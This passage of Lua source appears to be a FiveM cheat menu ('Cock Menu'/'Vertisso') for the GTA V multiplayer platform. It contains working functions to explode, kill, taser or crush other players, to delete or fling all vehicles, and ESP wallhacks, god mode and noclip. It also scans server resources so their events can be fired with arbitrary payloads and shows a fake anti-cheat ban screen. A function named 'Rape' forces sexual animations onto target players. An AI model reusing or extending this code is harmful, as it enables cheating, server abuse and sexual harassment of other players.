                               coords.y + 0.6,
                               coords.z + 1.5,
                               1,
                               1,
                               1
                           )
                           Fatasf.n.FreezeEntityPosition(obj7, true)
                           obj8 =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                               coords.x + 1.05,
                               coords.y - 1.05,
                               coords.z + 1.5,
                               1,
                               1,
                               1
                           ) 
                           Fatasf.n.SetEntityHeading(obj8, 90.0)
                           Fatasf.n.FreezeEntityPosition(obj8, true)
                       end
                   end,
                   FlyAllVehs = function()
                       for vehicle in Fatasf.n.EnumerateVehicles() do
                           Fatasf.n.NetworkRequestControlOfEntity(vehicle)
                           CockT.Inv["Invoke"](CockT.Natives['ApplyForceToEntity'], vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                       end
                   end,
                   HackPlayer = function(player)
                       CockT.Inv['Thread'](function()
                         Sec = 0 
                           while (CockT.Math.floor(Sec) < 20) do
                               CockT.display_menu = false
                               Fatasf.n.DrawSprite("loadshit", "vertissotraperdamnshit", 0.5, 0.5, 1.920, 1.0, 0.0, 255, 255, 255, 255)
                               Sec = Sec + 0.09
                               CockT.Inv["Wait"](0)
                           end
                           CockT.display_menu = true
                       end)
                     end,
   
                   DelAllVehs = function()
                       for vehicle in Fatasf.n.EnumerateVehicles() do
                           Fatasf.n.DeleteEntity(vehicle)
                       end	
                   end,
                   ExplodeAllPlayer = function()
                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do  
                           Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(i)), 8, 100.0, true, false, 0.0) 
                       end
                   end,
   
                   Text = function(text, x, y, scale, centre, font, _outl, colour)
                       Fatasf.n.SetTextFont(font)
                       Fatasf.n.SetTextCentre(centre)
                       Fatasf.n.SetTextOutline(_outl)
                       Fatasf.n.SetTextScale(0.0, scale or 0.25)
                       --Fatasf.n.SetTextColour(colour.r, colour.g, colour.b, colour.a)
                       Fatasf.n.SetTextEntry("STRING")
                       Fatasf.n.AddTextComponentString(text)
                       Fatasf.n.DrawText(x, y)
                   end,
                   Rape = function(target)
                       CockT.Inv["Thread"](
                           function()
                               if Fatasf.n.IsPedInAnyVehicle(
                                       Fatasf.n.GetPlayerPed(target),
                                       true
                                   )
                                then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(target), true)
                                   while not Fatasf.n.NetworkHasControlOfEntity(veh) do
                                       Fatasf.n.NetworkRequestControlOfEntity(veh)
                                       CockT.Inv["Wait"](0)
                                   end
                                   CockT.Inv["Invoke"](CockT.Natives["SetEntityAsMissionEntity"], veh, true, true)
                                   CockT.Inv["Invoke"](CockT.Natives["DeleteVehicle"], veh)
                                   Fatasf.n.DeleteEntity(veh)
                               end
                               count = -0.2
                               for b = 1, 3 do
                                   x, y, z =
                                       CockT.Strings.tunpack(
                                       Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(target), true)
                                   )
                                   local pp =
                                   Fatasf.n.ClonePed(
                                       Fatasf.n.GetPlayerPed(target),
                                       1,
                                       1,
                                       1
                                   )
                                   CockT.Inv["Invoke"](CockT.Natives["SetEntityAsMissionEntity"], pp, true, true)
                                   Fatasf.n.AttachEntityToEntity(
                                       pp,
                                       Fatasf.n.GetPlayerPed(target),
                                       4103,
                                       11816,
                                       count,
                                       0.00,
                                       0.0,
                                       0.0,
                                       0.0,
                                       0.0,
                                       false,
                                       false,
                                       false,
                                       false,
                                       2,
                                       true
                                   )
                                   CockT.Inv["Invoke"](
                                       CockT.Natives["ClearPedTasks"],
                                       Fatasf.n.GetPlayerPed(target)
                                   )
                                   Fatasf.n.TaskPlayAnim(
                                       Fatasf.n.GetPlayerPed(target),
                                       "rcmpaparazzo_2",
                                       "shag_loop_poppy",
                                       2.0,
                                       2.5,
                                       -1,
                                       49,
                                       0,
                                       0,
                                       0,
                                       0
                                   )
                                   Fatasf.n.SetPedKeepTask(pp)
                                   Fatasf.n.TaskPlayAnim(
                                       pp,
                                       "rcmpaparazzo_2",
                                       "shag_loop_a",
                                       2.0,
                                       2.5,
                                       -1,
                                       49,
                                       0,
                                       0,
                                       0,
                                       0
                                   )
                                   Fatasf.n.SetEntityInvincible(pp, true)
                                   count = count - 0.4
                               end
                           end
                       )
                   end,
                   DrawAKLine = function(bone)
                       local retval, _x, _y = Fatasf.n.GetScreenCoordFromWorldCoord(CockT.Strings.tunpack(Fatasf.n.GetPedBoneCoords(pPed, bone)))
                       Fatasf.n.DrawRect(_x - 0.01 / Distance, _y - 0.02, 0.0005 , 0.6 / Distance, 20, 254, 10, 255) 
                   end,
                   
                   
                   KBInput = function(TextEntry, ExampleText, MaxStringLength)
                       Fatasf.n.AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
                       CockT.Inv["Invoke"](
                           CockT.Natives["DisplayOnscreenKeyboard"],
                           1,
                           "FMMC_KEY_TIP1",
                           "",
                           ExampleText,
                           "",
                           "",
                           "",
                           MaxStringLength
                       )
                       blockinput = true
                       while Fatasf.n.UpdateOnscreenKeyboard() ~= 1 and Fatasf.n.UpdateOnscreenKeyboard() ~= 2 do
                           CockT.Inv["Wait"](0)
                       end
                       if Fatasf.n.UpdateOnscreenKeyboard() ~= 2 then
                           result = Fatasf.n.GetOnscreenKeyboardResult()
                           CockT.Inv["Wait"](500)
                           blockinput = false
                           return result
                       else
                           CockT.Inv["Wait"](500)
                           blockinput = false
                           return nil
                       end
                   end,
                   
                   TriggerCustomEvent = function(server, event, ...)
                       payload = CockT.Strings.msgpack({...})
                       if server then
                           Fatasf.n.TriggerServerEventInternal(event, payload, payload:len())
                       else
                           Fatasf.n.TriggerEventInternal(event, payload, payload:len())
                       end
                   end,
                   
                   TazePlayer = function(player)
                       local ped = Fatasf.n.GetPlayerPed(player)
                       local location = Fatasf.n.GetEntityCoords(ped)
                       local dest = Fatasf.n.GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
                       local org = Fatasf.n.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
                       Fatasf.n.ShootSingleBulletBetweenCoords(org, dest, 0.0, true, Fatasf.n.GetHashKey('WEAPON_STUNGUN'), Fatasf.n.PlayerPedId(), true, false, 1.0)
                   end,
                   KillPlayer = function(player)
                       local ped = Fatasf.n.GetPlayerPed(player)
                       local location = Fatasf.n.GetEntityCoords(ped)
                       local dest = Fatasf.n.GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
                       local org = Fatasf.n.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
                       Fatasf.n.ShootSingleBulletBetweenCoords(org, dest, 50.0, true, Fatasf.n.GetHashKey('WEAPON_PISTOL'), Fatasf.n.PlayerPedId(), true, false, 10000.0)
                   end,
                   TranslateFOVInNumber = function(sw)
                       px = sw / 80
                       px2 = 16 * px
                       return (sw - px2) / 2
                   end,
                   Lerp = function(delta, from, to)
                       if delta > 1 then return to end
                       if delta < 0 then return from end
                   
                       return from + (to - from) * delta
                   end,
                   IsInCFOVCircleFOV = function(cx, cy, rad, isx, isy)
                       distance = CockT.Math.sqrt((isx - cx) ^ 2 + (isy - cy) ^ 2)
                       if distance <= rad then
                           return true
                       else
                           return false
                       end
                   end,
                   DrawTextTest = function(name, _outl, size, Justification, xx, yy)
                       if _outl then
                           Fatasf.n.SetTextOutline()
                       end
                       Fatasf.n.SetTextScale(0.00, size)
                       Fatasf.n.SetTextFont(4)
                       Fatasf.n.SetTextProportional(0)
                       Fatasf.n.SetTextJustification(Justification)
                       Fatasf.n.SetTextEntry("string")
                       Fatasf.n.AddTextComponentString(name)
                       Fatasf.n.DrawText(xx, yy)
                   end,
                   RotationToDirection = function(Rotationation)
                       return CockT.Strings.vector3(
                           -CockT.Math.sin(CockT.Math.rad(Rotationation.z)) *
                               CockT.Math.abs(CockT.Math.cos(CockT.Math.rad(Rotationation.x))),
                           CockT.Math.cos(CockT.Math.rad(Rotationation.z)) *
                               CockT.Math.abs(CockT.Math.cos(CockT.Math.rad(Rotationation.x))),
                           CockT.Math.sin(CockT.Math.rad(Rotationation.x))
                       )
                   end,
                   ShitRain = function(target, model, result)
                       CockT.Inv["Thread"](
                           function(result)
                               for tye = 0, result do
                                   VehicleHash = Fatasf.n.GetHashKey(model)
                                   Fatasf.n.RequestModel(VehicleHash)
                                   x, y, z =
                                       CockT.Strings.tunpack(
                                       Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(target))
                                   )
                                   while not Fatasf.n.HasModelLoaded(VehicleHash) do
                                       Fatasf.n.RequestModel(VehicleHash)
                                       CockT.Inv["Wait"](15)
                                   end
                                   local cockmenu = {p = 82, s = 80}
                                   local SpawnedVeh =
                                       Fatasf.n.CreateVehicle(
                                       VehicleHash,
                                       x,
                                       y,
                                       z + 20.0,
                                       0.0,
                                       true,
                                       false
                                   )
                                   CockT.Inv["Invoke"](CockT.Natives["SetVehicleColours"], SpawnedVeh, cockmenu.p, cockmenu.s)
                                   Fatasf.n.SetVehicleNumberPlateText(SpawnedVeh, "Cock Menu")
                                   Fatasf.n.SetEntityVelocity(SpawnedVeh, 0.0, 0.0, -100.0)
                               end
                           end
                       )
                   end,
                   instructbutton = function()
                       local dW = {
                           {["label"] = "Change Speed", ["button"] = "~INPUT_SPRINT~"},
                           {["label"] = "Down", ["button"] = "~INPUT_HUD_SPECIAL~"},
                           {["label"] = "Up", ["button"] = "~INPUT_COVER~"},
                           {["label"] = "Back", ["button"] = "~INPUT_MOVE_DOWN_ONLY~"},
                           {["label"] = "Forward", ["button"] = "~INPUT_MOVE_UP_ONLY~"}
                       }
                       local dX = CockT.Inv["Invoke"](CockT.Natives["RequestScaleformMovie"], "instructional_buttons")
                       while not CockT.Inv["Invoke"](CockT.Natives["HasScaleformMovieLoaded"], dX) do
                           CockT.Inv["Wait"](0)
                       end
                       for dY, dZ in CockT.Math.ipairs(dW) do
                           CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunction"], dX, "SET_DATA_SLOT")
                           CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunctionParameterInt"], dY - 1)
                           CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieMethodParameterButtonName"], dZ["button"])
                           CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunctionParameterString"], dZ["label"])
                           CockT.Inv["Invoke"](CockT.Natives["PopScaleformMovieFunctionVoid"])
                       end
                       CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunction"], dX, "DRAW_INSTRUCTIONAL_BUTTONS")
                       CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunctionParameterInt"], -1)
                       CockT.Inv["Invoke"](CockT.Natives["PopScaleformMovieFunctionVoid"])
                       CockT.Inv["Invoke"](CockT.Natives["DrawScaleformMovieFullscreen"], dX, 255, 255, 255, 255)
                   end,
               
   
                   CamFwdVect = function(camf)
                       coords = Fatasf.n.GetCamCoord(camf)
                       rot = Fatasf.n.GetCamRot(camf, 0)
                       return CockT.Global.RotToQuat(rot) * CockT.Strings.vector3(0.0, 1.0, 0.0)
                   end,
                   CamRightVect = function(camf)
                       coords = Fatasf.n.GetCamCoord(camf)
                       rot = Fatasf.n.GetCamRot(camf, 0)
                       qrot = quat(0.0, CockT.Strings.vector3(rot.x, rot.y, rot.z))
                       return CockT.Global.RotToQuat(rot) * CockT.Strings.vector3(1.0, 0.0, 0.0)
                   end,
   
                   LoadHack = function()
                       local runtime_txd = Fatasf.n.CreateRuntimeTxd("bannedbyfiveguard")
                       local banner_dui = Fatasf.n.CreateAnDui("https://cdn.upload.systems/uploads/KQs7A9cr.gif", 640, 360)
                       local b_dui = Fatasf.n.GetDuiHandle(banner_dui)
                       Fatasf.n.CreateRuntimeTextureFromDuiHandle(runtime_txd, "vertissotraperdamnshit", b_dui)
                   end,
   
                   LoadGif1 = function()
                       local runtime_txd = Fatasf.n.CreateRuntimeTxd("batakmenu")
                       local banner_dui = Fatasf.n.CreateAnDui("https://cdn.upload.systems/uploads/N31thLbZ.gif", 400, 107)
                       local b_dui = Fatasf.n.GetDuiHandle(banner_dui)
                       Fatasf.n.CreateRuntimeTextureFromDuiHandle(runtime_txd, "vertissotraperdamnshit", b_dui)
                   end,
                   LoadGifLSC = function()
                       local runtime_txd = Fatasf.n.CreateRuntimeTxd("czolgista")
                       local banner_dui = Fatasf.n.CreateAnDui("https://cdn.upload.systems/uploads/zWCuP51E.gif", 400, 107)
                       local b_dui = Fatasf.n.GetDuiHandle(banner_dui)
                       Fatasf.n.CreateRuntimeTextureFromDuiHandle(runtime_txd, "vertissotraperdamnshit", b_dui)
                   end,
                   LoadGif2 = function()
                       local runtime_txd = Fatasf.n.CreateRuntimeTxd("batakmenu")
                       local banner_dui =
                           Fatasf.n.CreateAnDui(
                           "https://cdn.upload.systems/uploads/5jVIL5F4.gif",
                           400,
                           235
                       )
                       local b_dui = Fatasf.n.GetDuiHandle(banner_dui)
                       Fatasf.n.CreateRuntimeTextureFromDuiHandle(runtime_txd, "batakfrajer", b_dui)
                   end,
                   LoadGif3 = function()
                       local runtime_txd = Fatasf.n.CreateRuntimeTxd("batakmenu")
                       local banner_dui =
                           Fatasf.n.CreateAnDui(
                           "https://cdn.upload.systems/uploads/apVE5sjc.gif",
                           400,
                           107
                       )
                       local b_dui = Fatasf.n.GetDuiHandle(banner_dui)
                       Fatasf.n.CreateRuntimeTextureFromDuiHandle(runtime_txd, "batakfrajer", b_dui)
                   end,
                   LoadGif4 = function()
                       local runtime_txd = Fatasf.n.CreateRuntimeTxd("batakmenu")
                       local banner_dui =
                           Fatasf.n.CreateAnDui(
                           "https://cdn.upload.systems/uploads/FBV9rFVS.gif",
                           500,
                           281
                       )
                       local b_dui = Fatasf.n.GetDuiHandle(banner_dui)
                       Fatasf.n.CreateRuntimeTextureFromDuiHandle(runtime_txd, "batakfrajer", b_dui)
                   end,
   
                   PedRotation = function(entity, rotationOrder)
                       return Fatasf.n.GetEntityRotation(entity, rotationOrder, _cit_.ResultAsVector())
                   end,
                   GetRotation = function(v) 
                       return CockT.Strings.vector3(CockT.Math.deg(CockT.Math.atan2(v.z, #vector2(v.x, v.y))), 0.0, -CockT.Math.deg(CockT.Math.atan2(v.x, v.y))) 
                   end,
                   UpdateAllTriggers = function()
                       Fatasf.n.Leprint("^1[^2Vertisso Logs^1] ^7Loading dynamic triggers...")
                       CockT.Inv["Thread"](
                           function()
                               CockT.Inv["Wait"](500)
                               local fitimeone =Fatasf.n.GetResources()
                               for kk, v in CockT.Math.ipairs(CockT.DynamicTriggers) do
                                   for i = 0, #fitimeone do
                                       local script = CockT.Strings.lower(fitimeone[i])
                                       if type(v.resourcelooklike) == "table" then
                                           for E, pirs in CockT.Math.pairs(v.resourcelooklike) do
                                               if
                                                   CockT.Strings.find(script, pirs) and
                                                       Fatasf.n.GetResourcestatus(fitimeone[i])
                                                then
                                                   v.resource = fitimeone[i]
                                               end
                                           end
                                       else
                                           if CockT.Strings.find(script, v.resourcelooklike) and Fatasf.n.GetResourcestatus(fitimeone[i]) then v.resource = fitimeone[i]
                                           end
                                       end
                                   end
                               end
                               CockT.Inv["Wait"](100)
                               for k, v in CockT.Math.pairs(CockT.DynamicTriggers) do
                                   Functions.f.GetAllTriggers(v)
                                   CockT.Inv["Wait"](15)
                               end
                           end)
                   end,
   
               },
           }
           CockMeni.Functions.LoadGif1()
           CockMeni.Functions.LoadHack()
           CockMeni.Functions.UpdateAllTriggers()
           CockMeni.Functions.stscr = 0.0
           
           CockT.Inv["Thread"](function()
               while CockMenu.MenuEnabled do
                   CockT.Inv["Wait"](0)
                   local value, label = Functions.f.BindOnStart()
                   CockMenu.CockKeybinds.Menu.OpenMenuKey["Label"] = label
                   CockMenu.CockKeybinds.Menu.OpenMenuKey["Value"] = value
                   break
               end
           end)
           
           CockT.Inv["Thread"](function()
               while CockMenu.MenuEnabled do
                   CockT.Inv["Wait"](0)
                   if Fatasf.n.IsDisabledControlJustReleased(1, CockMenu.CockKeybinds.Menu.OpenMenuKey["Value"]) then
                       CockT.display_menu = not CockT.display_menu
                   end
                   if CockT.display_menu then
                       CockMeni.Functions.MButtons()
                       CockT.Global.Dmovement(true)
       
                       local c_x, c_y = Fatasf.n.GetNuiCursorPosition()  local widht, height = Fatasf.n.GetActiveScreenResolution() c_x = c_x / widht c_y = c_y / height
                       CockT.Global.DrawText('+', c_x, c_y-0.0025, true, 0.3, 0, true)
                   end
               end
           end)
           
           --=
           
           CockT.Inv["Thread"](function()
               while CockMenu.MenuEnabled do
                   CockT.Inv["Wait"](0)
                   
                   if Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.Noclip["Value"]) then
                       Cock.Menu.NClip = not Cock.Menu.NClip
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.Heal["Value"]) then
                       Fatasf.n.SetEntityHealth(Fatasf.n.PlayerPedId(), 200)
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.Revive["Value"]) then
                       CockMenu.Main.natRe()
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.Armour["Value"]) then
                       Fatasf.n.SetPedArmour(Fatasf.n.PlayerPedId(), 100)
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.Freecam["Value"]) then
                       Cock.Menu.Freecam = not Cock.Menu.Freecam
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.Godmode["Value"]) then
                       Cock.Menu.Godmode = not Cock.Menu.Godmode
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.fixveh["Value"]) then
                       Functions.f.RepairVehicle()
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.givevintage["Value"]) then
                       Fatasf.n.GiveWeaponToPed(Fatasf.n.PlayerPedId(), Fatasf.n.GetHashKey("weapon_vintagepistol"), 150, false, false)
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.givepistol["Value"]) then
                       Fatasf.n.GiveWeaponToPed(Fatasf.n.PlayerPedId(), Fatasf.n.GetHashKey("weapon_pistol"), 150, false, false)
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.invisible["Value"]) then
                       Cock.Menu.invisible = not Cock.Menu.invisible
                   elseif Fatasf.n.IsDisabledControlJustPressed(0, CockMenu.CockKeybinds.Menu.unlockveh["Value"]) then
                       local vehicle = CockT.Inv["Invoke"](CockT.Natives['GetClosestVehicle'], Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 15.0, 0, 70)
                       Functions.f.UnlockVehicle(vehicle)
                   end
   
                   if Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false) ~= 0 then
                       --SetVehicleFuelLevel(Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId()), Cock.Sliders['FuelVal'].value)
                   end
                   
                   --Fatasf.n.SetRunSprintMultiplierForPlayer(Fatasf.n.PlayerId(-1), CockT.Global.mathround(Cock.Sliders['Sprint'].value, 2))
                   --Fatasf.n.SetPedMoveRateOverride(Fatasf.n.PlayerPedId(), CockT.Global.mathround(Cock.Sliders['Sprint'].value, 2))
                   
                   if Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false) ~= 0 then
                       CockT.Inv["Invoke"](CockT.Natives['SetVehicleGravityAmount'], Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId()), Cock.Sliders['VehSpeed'].value+0.0)
                   end
           
                   if Cock.Menu.cockplate then
                       CockMeni.Functions.cockplate()
                   end
           
                   if Cock.Menu.DriveToWaypoint then
                      CockMeni.Functions.DriveToWaypoint()
                   end
   
                   if Cock.Menu.nofall then
                       CockT.Inv["Invoke"](CockT.Natives["SetPedCanBeKnockedOffVehicle"], Fatasf.n.PlayerPedId(), true)
                   else
                       CockT.Inv["Invoke"](CockT.Natives["SetPedCanBeKnockedOffVehicle"], Fatasf.n.PlayerPedId(), false)
                   end
   
                  
           
                   if Cock.Menu.vehesp then
                       for vehs in Fatasf.n.EnumerateVehicles() do
                           local vehX, vehY, vehZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(vehs))
                           local xx = CockT.Math.tonumber(CockT.Strings.format("%.2f", vehX))
                           local yy = CockT.Math.tonumber(CockT.Strings.format("%.2f", vehY))
                           local zz = CockT.Math.tonumber(CockT.Strings.format("%.2f", vehZ))
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(vehs), Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), true) < Cock.Sliders['EspDistance'].value+0.0 then
                               local text = 'Model: '..Fatasf.n.GetDisplayNameFromVehicleModel(Fatasf.n.GetEntityModel(vehs))..'\nHash: '..Fatasf.n.GetEntityModel(vehs)..'\n~g~X: ~s~'..xx..' ~g~Y: ~s~'..yy..' ~g~Z: ~s~'..zz
                               CockT.Global.DrawTextOnCoords(xx, yy, zz, text, 255, 255, 255, 0, 0.20)
                           end
                       end
                   end
   
                   if Cock.Menu.blipsonmap then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local entity = Fatasf.n.GetPlayerPed(v)
                           local blip = CockT.Inv["Invoke"](CockT.Natives["AddBlipForEntity"], entity)
                           CockT.Inv["Invoke"](CockT.Natives["SetBlipAsFriendly"], blip, true)
                           CockT.Inv["Invoke"](CockT.Natives["SetBlipSprite"], blip, 1)
                           CockT.Inv["Invoke"](CockT.Natives["SetBlipColour"], blip, 17)
                           CockT.Inv["Invoke"](CockT.Natives["SetBlipNameToPlayerName"], blip, v)
                           if Fatasf.n.GetEntityHealth(entity) < 1 then
                               CockT.Inv["Invoke"](CockT.Natives["SetBlipSprite"], blip, 274)
                               CockT.Inv["Invoke"](CockT.Natives["SetBlipColour"], blip, 1)
                           end
                       end
                   elseif not Cock.Menu.blipsonmap then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local entity = Fatasf.n.GetPlayerPed(v)
                           local blip = CockT.Inv["Invoke"](CockT.Natives["GetBlipFromEntity"], entity)
                           if Fatasf.n.DoesBlipExist(blip) then
                               CockT.Inv["Invoke"](CockT.Natives["RemoveBlip"], _cit_.PointerValueIntInitialized(blip))
                           end
                       end
                   end
   
                   if Cock.Menu.espglow then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           if Cock.Menu.includeself then
                               er = nil
                           else
                               er = Fatasf.n.PlayerPedId()
                           end
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < Cock.Sliders['EspDistance'].value+0.0 and pPed ~= er then
                               local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(pPed, true))
                               CockT.Inv["Invoke"](CockT.Natives['DrawMarker'], 28, Fatasf.n.GetPedBoneCoords(pPed, 31086, 0.0, 0.0, 0.0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.57, 0.57, 1.75, 255, 255, 255, 255, false, false, 2, 0.0, 0.0, true, true)
                               CockT.Inv["Invoke"](CockT.Natives['DrawMarker'], 28, Fatasf.n.GetPedBoneCoords(pPed, 14201, 0.0, 0.0, 0.0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.2, 0.2, 0.2, 255, 255, 255, 255, false, false, 2, 0.0, 0.0, true, true)
                               CockT.Inv["Invoke"](CockT.Natives['DrawMarker'], 28, Fatasf.n.GetPedBoneCoords(pPed, 52301, 0.0, 0.0, 0.0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.2, 0.2, 0.2, 255, 255, 255, 255, false, false, 2, 0.0, 0.0, true, true)
                           end
                       end
                   end
   
                   if Cock.Menu.cornerbox then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           if Fatasf.n.IsEntityOnScreen(pPed) then
                               if Cock.Menu.includeself then
                                   er = nil
                               else
                                   er = Fatasf.n.PlayerPedId()
                               end
                               if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < Cock.Sliders['EspDistance'].value+0.0 and pPed ~= er then
                                   local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                                   local X, Y = Fatasf.n.GetActiveScreenResolution()
                                   Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))
                                   Fatasf.n.DrawRect(-0.265/dist, -0.92/dist, 1 / X, 0.15/dist, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(-0.265/dist, 0.92/dist, 1 / X, 0.15/dist, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(0.265/dist, -0.92/dist, 1 / X, 0.15/dist, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(0.265/dist, 0.92/dist, 1 / X, 0.15/dist, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(-0.215/dist, -0.994/dist, 0.1/dist, 1 / Y, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(0.215/dist, -0.994/dist, 0.1/dist, 1 / Y, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(0.215/dist, 0.994/dist, 0.1/dist, 1 / Y, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(-0.215/dist, 0.994/dist, 0.1/dist, 1 / Y, 255, 255, 255, 255)
                               end
                           end
                           Fatasf.n.ClearDrawOrigin()
                       end
                   end
                   
                   if Cock.Menu.hpbar then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           if Fatasf.n.IsEntityOnScreen(pPed) then
                               if Cock.Menu.includeself then
                                   er = nil
                               else
                                   er = Fatasf.n.PlayerPedId()
                               end
                               if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < Cock.Sliders['EspDistance'].value+0.0 and pPed ~= er then
                                   local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                                   Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))          
                                   Fatasf.n.DrawRect(-0.2745 / dist - (dist / 500) / dist, 0, 0.0015, 2.0 / dist, 0, 0, 0, 90)
                                   Fatasf.n.DrawRect(-0.2745 / dist - (dist / 500) / dist, 0.999 / dist - Fatasf.n.GetEntityHealth(pPed) / 195 / dist, 0.0005, Fatasf.n.GetEntityHealth(pPed) / 98 / dist, 30, 255, 30, 255)
                               end
                           end
                           Fatasf.n.ClearDrawOrigin()
                       end
                   end
   
                   if Cock.Menu.armourbar then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           if Fatasf.n.IsEntityOnScreen(pPed) then
                               if Cock.Menu.includeself then
                                   er = nil
                               else
                                   er = Fatasf.n.PlayerPedId()
                               end
                               if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < Cock.Sliders['EspDistance'].value+0.0 and pPed ~= er then
                                   local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                                   Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))          
   
                                   Fatasf.n.DrawRect(-0.3 / dist - (dist / 500) / dist, 0, 0.0015, 2.0 / dist, 0, 0, 0, 90)
                                   Fatasf.n.DrawRect(-0.3 / dist - (dist / 500) / dist, 0.999 / dist - Fatasf.n.GetPedArmour(pPed) / 100.5 / dist, 0.0005, Fatasf.n.GetPedArmour(pPed) / 50 / dist, 0, 174, 255, 255)
                               end
                           end
                           Fatasf.n.ClearDrawOrigin()
                       end
                   end
                   if Cock.Menu.boxesV3 then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           if Fatasf.n.IsEntityOnScreen(pPed) then
                               if Cock.Menu.includeself then
                                   er = nil
                               else
                                   er = Fatasf.n.PlayerPedId()
                               end
                               if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < Cock.Sliders['EspDistance'].value+0.0 and pPed ~= er then
                                   local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                                   Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))
                                   Fatasf.n.DrawRect(0, 0, 0.53 / dist, 2.0 / dist, 0, 0, 0, 140)
                               end
                           end
                       end
                   end
                   if Cock.Menu.boxesV2 then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           if Fatasf.n.IsEntityOnScreen(pPed) then
                               if Cock.Menu.includeself then
                                   er = nil
                               else
